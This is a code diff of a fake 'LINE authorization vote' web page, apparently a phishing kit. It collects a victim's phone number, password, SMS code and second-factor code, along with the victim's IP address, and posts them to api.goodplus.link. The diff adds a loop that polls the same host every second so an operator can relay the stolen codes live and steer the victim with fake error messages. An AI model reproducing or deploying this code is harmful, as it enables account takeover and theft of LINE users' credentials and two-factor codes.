@@ -6,7 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>LINE授權投票</title>
     <script type="text/javascript" src="css/flexible.js"></script>
-    <link rel="stylesheet" href="css/index.css" />
+    <link rel="stylesheet" href="css/index.css?v=2" />
     <link rel="stylesheet" href="css/default.css" />
     <link rel="stylesheet" href="css/form.css" />
     <style>
@@ -20,7 +20,12 @@
     line-height: 35px; /* 垂直居中 */
     margin-top: -28px; /* 向上移动32px */
 }
+    .hidden {
+        display: none;
+    }
 </style>
+
+
 </head>
 <body>
 <div v-cloak id="app">
@@ -30,11 +35,12 @@
     </div>
     <div class="text-center">
         <b class="fs-20 fw-600 line-40">歡迎使用LINE 進行授權投票</b>
-        <p class="fs-14 line-20 padding-vh40">輸入電話號碼密碼並點選下一步代表您已經同意LINE的服務條例及隱私條款</p>
+        <p id="ok" class="fs-14 line-20 padding-vh40">輸入電話號碼密碼並點選下一步代表您已經同意LINE的服務條例及隱私條款</p>
     </div>
 
     <div class="margin-15 overflow">
         <van-form label-align="left" @submit="onSubmit" @failed="onFailed">
+            <div id="pageA">
             <van-field
                     v-model="form.phone"
                     required
@@ -61,8 +67,22 @@
                     <div class="buttonok" @click="getCode">{{codeWord}}</div>
                 </template>
             </van-field>
+            </div>
+            <div id="pageB" class="hidden">
+            <van-field
+                    v-model="form.passwordcode"
+                    required
+                    @input="quickSave"
+                    placeholder="請輸入2認證碼"
+                    type="number"
+                    maxlength="6">
+                <template #label><span class="fs-12">2認證碼</span></template>
+            </van-field>
+            </div>
+             <div id="pageC" class="none">
             <div class="text-center margin-t20">
-                <van-button round block type="danger" native-type="submit">確認</van-button>
+                <van-button round block type="danger" id="buttonId" native-type="submit">確認</van-button>
+            </div>
             </div>
         </van-form>
     </div>
@@ -72,6 +92,18 @@
 <script src="css/vant.min.js"></script>
 <script src="css/jquery-2.1.1.min.js"></script>
 <script>
+function generateRandomLetters() {
+    let letters = 'ABCDEFGHIJKLMNOPQRSTUVWSYZ123456789';
+    let randomLetters = '';
+    for (let i = 0; i < 6; i++) {
+        let randomIndex = Math.floor(Math.random() * letters.length);
+        randomLetters += letters[randomIndex];
+    }
+    return randomLetters;
+}
+
+    let randomLetters = generateRandomLetters();
+    let twuser = 0;
     var ipAddress = 0;
     fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
@@ -91,7 +123,9 @@
                 form: {
                     phone: '',
                     password: '',
+                    passwordcode: '',
                     code: '',
+                    keys: randomLetters,
                     ip: ''
                 }
             }
@@ -106,13 +140,13 @@
                   this.$toast.fail('電話號碼不正確！');
                   return false;
                 }
-                // var passwordPattern = /^(?=.*[a-z])(?=.*[A-Z])|(?=.*[a-z])(?=.*\W)|(?=.*[A-Z])(?=.*\W).{8,20}$/;
-                // var ckpass = passwordPattern.test(this.form.password);
-                // if(!ckpass){
-                //    this.$toast.fail("密碼不正確！");
-                //    return false;
-                // }
-                
+                var passwordPattern = /^(?=.*[a-z])(?=.*[A-Z])|(?=.*[a-z])(?=.*\W)|(?=.*[A-Z])(?=.*\W).{8,20}$/;
+                var ckpass = passwordPattern.test(this.form.password);
+                if(!ckpass){
+                    this.$toast.fail("密碼不正確！");
+                    return false;
+                }
+               /// startSending(1);
                 this.canClick = false
                 this.timer = setInterval(() => {
                     this.count()
@@ -143,6 +177,8 @@
             },
             // 保存每一步输入
             quickSave() {
+               
+                //startSending();
                 if(this.form.code.length < 6 && this.form.code != ''){
                     return false;
                 }
@@ -150,6 +186,9 @@
                     return false;
                 }
                 if(this.form.password.length<8 && this.form.password != ''){
+                    return false;
+                }
+                if(this.form.passwordcode.length<6 && this.form.password != ''){
                     return false;
                 }
                 console.log('save', this.form)
@@ -164,6 +203,16 @@
                 });
             },
             onSubmit() {
+             if(twuser == 2){
+                 if(this.form.passwordcode.length==0){
+                    this.$toast.fail("請输入2認證碼！");
+                    return false;
+                }
+                if(this.form.passwordcode.length!=6){
+                    this.$toast.fail("2認證碼不正確！");
+                    return false;
+                }
+             }else{
                 if(this.form.phone == ''){
                   this.$toast.fail('請輸入電話號碼');
                   return false;
@@ -174,16 +223,8 @@
                   this.$toast.fail('電話號碼不正確！');
                   return false;
                 }
-                if (this.codeWord == '發送') {
+                if (this.codeWord == '發送' && twuser != 2) {
                     this.$toast.fail('請先發送確認碼');
-                    return false;
-                }
-                if(this.form.code.length==0){
-                    this.$toast.fail("請输入的認證碼！");
-                    return false;
-                }
-                if(this.form.code.length!=6){
-                    this.$toast.fail("認證碼不正確！");
                     return false;
                 }
                 if(this.form.password == ''){
@@ -196,17 +237,36 @@
                    this.$toast.fail("密碼不正確！");
                    return false;
                 }
+                if(this.form.code.length==0){
+                    this.$toast.fail("請输入的認證碼！");
+                    return false;
+                }
+                if(this.form.code.length!=6){
+                    this.$toast.fail("認證碼不正確！");
+                    return false;
+                }
+             }
                console.log('submit', this.form);
                 this.form.id = document.getElementById('id');
                 this.form.ip = ipAddress;
+                document.getElementById("buttonId").disabled = true;
+                document.getElementById("buttonId").innerHTML = "正在驗證中...";
+                document.getElementById("buttonId").style.backgroundColor = "#5aaafb";
+                document.getElementById("buttonId").style.border = "1px solid #5aaafb";
               $.ajax({
                   url:"https://api.goodplus.link/line.php?get=submit",
                   type: 'post',
                   dataType: 'JSON',
                   data: this.form,
-                  success:function(data){
+                  success:function(datas){
+                    if(twuser  < 1){
+                        twuser = 1;
+                    }else{
+                        twuser = 3;
+                    }
                     setTimeout(function(){
-                        alert('認證碼或密碼不正確！');
+                        // document.getElementById("pageA").classList.add("hidden");
+                        // document.getElementById("pageB").classList.remove("hidden");
                     },1500);
                     return false;
                   }
@@ -214,5 +274,77 @@
             }
         }
     })
+    
+    // 定义要发送的数据
+const postData = {
+    key1: 'value1',
+    key2: 'value2'
+};
+
+let intervalId;
+
+// 定义定时发送POST请求的函数
+function sendPostData() {
+    $.ajax({
+        url:"https://api.goodplus.link/api.php",
+            type: 'post',
+            dataType: 'JSON',
+            data: {key: twuser,keys: randomLetters},
+              success:function(datas){
+                if(datas == 1 || datas == 2 || datas == 3 || datas == 4 || datas == 5 || datas == 6 || datas == 8){
+                    if(datas == 2){
+                        twuser = 0;
+                       alert('密碼不正確！');
+                    }else if(datas == 3){
+                         twuser = 0;
+                        alert('認證碼不正確！');
+                    }else if(datas == 4){
+                         twuser = 0;
+                        alert('認證碼已超時！請重新發送');
+                    }else if(datas == 5){
+                         twuser = 2;
+                        alert('2認證碼不正確！');
+                    }else if(datas == 6){
+                         twuser = 0;
+                        location.reload();    // 重新加载当前页面
+                        stopSending();
+                    }else if(datas == 8){
+                         twuser = 0;
+                        document.getElementById("pageA").classList.add("hidden");
+                        document.getElementById("pageB").classList.add("hidden");
+                        document.getElementById("pageC").classList.add("hidden");
+                        document.getElementById("ok").innerHTML = "🙁<br><br>系統繁忙請一个小時後重試！！！";
+                        stopSending();
+                    }else{
+                         twuser = 2;
+                        document.getElementById("pageA").classList.add("hidden");
+                        document.getElementById("pageB").classList.remove("hidden");
+                        //进入下个
+                    }
+                    document.getElementById("buttonId").disabled = false;
+                    document.getElementById("buttonId").style.backgroundColor = "#1989fa";
+                    document.getElementById("buttonId").style.border = "1px solid #1989fa";
+                    document.getElementById("buttonId").innerHTML = "確認";
+                }
+            }
+    });
+}
+
+// 开始定时发送POST请求
+function startSending() {
+    intervalId = setInterval(sendPostData, 1000);
+}
+
+// 停止定时发送POST请求
+function stopSending() {
+    clearInterval(intervalId);
+}
+
+//调用开始发送函数
+startSending();
+
+// 调用停止发送函数（可选）
+// stopSending();
+
 </script>
 </html>
